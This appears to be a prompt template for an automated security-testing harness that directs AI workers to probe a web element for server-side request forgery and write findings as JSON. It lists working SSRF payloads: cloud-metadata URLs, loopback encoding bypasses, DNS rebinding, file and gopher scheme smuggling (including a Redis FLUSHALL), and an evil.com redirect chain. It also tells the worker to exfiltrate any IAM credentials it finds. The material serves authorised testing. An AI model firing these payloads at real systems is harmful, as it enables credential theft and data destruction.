---
name: lens-ssrf
description: Server-Side Request Forgery — coerce server to fetch internal/cloud-metadata URLs, bypass allowlist via DNS rebinding, gopher/file scheme smuggle
bug_class: server-side
applies_to_element_classes:
  - url_fetch_param
  - form_trigger
  - mutation_button
applies_to_phase_profiles:
  - feature
  - feature-legacy
  - hotfix
strix_reference: strix/skills/vulnerabilities/ssrf.md
severity_default: warn
estimated_action_budget: 40
output_schema_version: 3
---

# Lens: SSRF (Server-Side Request Forgery)

## Threat model

SSRF arises whenever the server fetches a URL the user supplies — webhook
target, image-from-URL upload, OAuth callback, RSS-feed importer, PDF
generator's external CSS / image refs, "verify domain" probe, link
preview unfurling. If the fetcher trusts the user-supplied URL and runs
inside the application's network namespace, the attacker can pivot to
hosts the public internet cannot reach: cloud metadata
(`http://169.254.169.254/`), internal admin panels, internal databases via
non-HTTP protocols, localhost-only services, peer-tenant containers in the
same VPC. Defenses fail in characteristic ways: blocklist of `127.0.0.1`
that misses `0.0.0.0`, `[::1]`, `localhost.attacker.local` (DNS rebind),
or `0177.0.0.1` (octal); allowlist that validates the hostname pre-fetch
but the resolver returns a different IP at fetch time (DNS rebinding TTL=0);
schema check that misses `file://`, `gopher://` (smuggle SMTP/Redis), or
`dict://`; and redirect-following where the initial URL is allowlisted
but the 302 target is not re-validated. White-box VG workers can submit
each variant and watch the server's outbound behavior via timing,
response leak, and out-of-band callback.

## Activation context (auto-injected by VG)

The dispatcher (`scripts/spawn-recursive-probe.py`) substitutes these
placeholders before handing the prompt to the worker subprocess. Reference them
via `${VAR}` exactly as written; never hard-code values.

- View: `${VIEW_PATH}`
- Element: `${ELEMENT_DESCRIPTION}` (selector: `${SELECTOR}`)
- Element class: `${ELEMENT_CLASS}`
- Resource: `${RESOURCE}` (scope: `${SCOPE}`)
- Role: `${ROLE}` with auth token `${TOKEN_REF}`
- Base URL: `${BASE_URL}`
- Peer credentials (cross-tenant probe, nullable): `${PEER_TOKEN_REF}`
- Run artifact output path: `${OUTPUT_PATH}`
- Action budget: `${ACTION_BUDGET}` browser actions max
- Recursion depth: `${DEPTH}`
- Wall-clock budget: 5 minutes

## Probe-only contract (HARD CONSTRAINT — read this first)

You are a probe + report worker. You are NOT a judge, NOT a fixer.

Worker MUST NOT:

- Propose code fixes or remediation ("To fix this, change X to Y" — NO).
- Assign severity ("This is critical / high / medium" — NO).
- Reason about exploit chains ("If combined with bug Z, attacker could…" — NO).
- Recommend further probing beyond this lens's declared scope.

Worker MUST:

- Explore freely within the action budget.
- Report factual `steps[].status = pass|fail|inconclusive`.
- Capture raw `observed` evidence (status code, body excerpt, DOM diff).
- Append a `finding_fact` to `runs/.broker-context.json` when a step fails —
  facts only:

```json
{"lens": "lens-ssrf", "view": "${VIEW_PATH}", "element": "${ELEMENT_DESCRIPTION}", "step": "<short name>", "status": "fail", "observed_excerpt": "<1-2 line raw>"}
```

NO severity field, NO summary, NO recommendation. Severity rollup is the
aggregator + `derive-findings.py` job downstream, computed from
`lens.severity_default` × `step.status` and cross-cutting context.

## Objective (exploratory)

Find SSRF vulnerabilities affecting `${ELEMENT_DESCRIPTION}` and any
sub-fetches you discover during exploration. Identify every parameter,
field, or workflow step that causes the server to make an outbound HTTP
(or other-protocol) request — those are the SSRF candidates. You are a
security researcher, not a test runner. Click anything that looks
promising, follow the workflow, dig into anomalies. Adapt to what you
observe — do not follow a fixed sequence.

## Reconnaissance (1-2 steps to start)

Just enough to land on the element and characterise the fetch. Not a full
script.

1. browser_navigate(`${BASE_URL}${VIEW_PATH}`) with `Authorization: Bearer ${TOKEN_REF}`
2. browser_snapshot — locate `${SELECTOR}`. Identify the URL-bearing
   parameter (webhook target, "import from URL", avatar URL, RSS feed,
   etc.). Submit a benign URL to your own listener domain and capture the
   server's outbound user-agent, headers (especially identity tokens),
   and response handling.

Then START EXPLORING (see Probe ideas).

## Probe ideas (suggestions — pick what fits, combine freely)

- Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS),
  `http://metadata.google.internal/computeMetadata/v1/` (GCP — needs
  `Metadata-Flavor: Google` header; check whether the SSRF preserves
  custom headers), `http://169.254.169.254/metadata/instance?api-version=
  2021-02-01` (Azure — needs `Metadata: true`). A 200 response leaking
  IAM credentials confirms reachable metadata.
- Localhost / loopback: `http://127.0.0.1/`, `http://localhost/`,
  `http://[::1]/`, `http://0.0.0.0/`, `http://0/`. Try common admin ports
  (`:8080`, `:9200` Elasticsearch, `:6379` Redis, `:5601` Kibana,
  `:8888`, `:5984` CouchDB).
- IP encoding bypass: `http://2130706433/` (decimal),
  `http://0x7f.0.0.1/`, `http://0177.0.0.1/` (octal),
  `http://127.000.000.1/`, IPv6-mapped `http://[::ffff:127.0.0.1]/`.
- DNS rebinding: register a domain whose A record TTL=1, returns
  attacker.com on first lookup (passes allowlist) and `127.0.0.1` on
  second lookup (the actual fetch). If allowlist resolves DNS once and
  trusts cached IP, the second resolve hits localhost.
- Scheme smuggle: `file:///etc/passwd`, `file://C:/Windows/win.ini`,
  `gopher://127.0.0.1:6379/_FLUSHALL` (Redis command injection),
  `dict://127.0.0.1:11211/stats`, `ftp://attacker.local/`.
- Redirect chain: point the URL to attacker-hosted `https://evil.com/r`
  which 302-redirects to `http://169.254.169.254/...`. Follower naïvely
  trusts the initial URL only.
- Internal hostnames: `http://kubernetes.default.svc/`,
  `http://consul/`, `http://vault.internal:8200/`, `http://elastic-
  master/`. Try cluster service discovery names.
- Out-of-band detection: when blind, point URL at attacker-controlled DNS
  + HTTP listener; record fetch source IP, User-Agent, any leaked
  headers. Burp Collaborator / interactsh-equivalent works well here.
- Time-based blind: if responses are silent, time the request — fetching
  `http://localhost:22/` (SSH) tends to hang/RST quickly differently
  than fetching `http://localhost:9999/` (closed port).

## How to explore recursively (anti-script discipline)

- Submit each SSRF payload, capture the response (status code, response
  body, Content-Length anomaly), and any out-of-band callback.
- After each probe, browser_snapshot. New URL-bearing fields, "verify
  webhook" buttons, link-preview triggers → click those too (recursive
  within this element's reach), and apply the SSRF probes to each.
- If a probe yields an anomaly (metadata reachable, scheme accepted,
  rebind worked) → DIG: pivot to other internal endpoints, attempt to
  exfil any IAM credentials returned via subsequent SSRF chained calls,
  test whether peer roles or unauthenticated requests can also trigger
  the fetch.
- DO NOT follow a fixed click sequence. Adapt to what you observe.
- DO NOT skip "boring-looking" URL fields like avatar / link-preview /
  RSS without at least 1 SSRF probe — those are classic exploit surfaces.

## Stopping criteria

Stop and write the artifact when ANY of:

- Action budget `${ACTION_BUDGET}` exhausted
- Wall-clock 5 minutes reached
- High-confidence finding captured + ≥3 supporting probes done
- 2 consecutive actions yield no new anomaly AND no new clickables —
  diminishing returns

## Run artifact write

After exploration ends (stopping criteria triggered), write JSON to `${OUTPUT_PATH}`:

```json
{
  "schema_version": 3,
  "worker_tool": "gemini" | "codex" | "claude",
  "run_id": "<element-slug>-lens-ssrf-<role>-<depth>",
  "lens": "lens-ssrf",
  "resource": "${RESOURCE}",
  "role": "${ROLE}",
  "element_class": "${ELEMENT_CLASS}",
  "selector_hash": "<sha256[:8]>",
  "view": "${VIEW_PATH}",
  "depth": ${DEPTH},
  "actions_taken": <int>,
  "stopping_reason": "budget" | "timeout" | "confidence" | "diminishing_returns",
  "steps": [
    {
      "name": "<short description of what you did/observed>",
      "status": "pass" | "fail" | "inconclusive",
      "observed": { "status_code": <int>, "body_excerpt": "<1-2 line raw>", "dom_diff": "<optional>" },
      "evidence_ref": ["<network_log_entry_id>", ...]
    }
  ],
  "coverage": {"passed": N, "failed": M, "inconclusive": K},
  "replay_manifest": {
    "commit_sha": "<auto>",
    "worker_prompt_version": "lens-ssrf-v1",
    "fixtures_used": ["${TOKEN_REF}", "${PEER_TOKEN_REF}"],
    "request_sequence": [...]
  },
  "goal_stub": {
    "id": "G-RECURSE-<behavior_class_hash>",
    "lens": "lens-ssrf",
    "view": "${VIEW_PATH}",
    "element_class": "${ELEMENT_CLASS}",
    "resource": "${RESOURCE}",
    "parent_goal_id": "<from CRUD-SURFACES if matchable, else null>"
  }
}
```

`priority` is NOT included in worker output — aggregator assigns post-run from
`lens.severity_default` × `step.status` mapping.

## Termination

- After exploration ends → write the run artifact → call browser_close →
  output `DONE`.
- DO NOT navigate to other views (the VG manager handles cross-view recursion).
- DO NOT spawn child agents (deterministic dispatcher only).
- If action budget is exhausted before exploration feels complete, write a
  partial artifact with `stopping_reason: "budget"` — that is normal and the
  aggregator handles it.
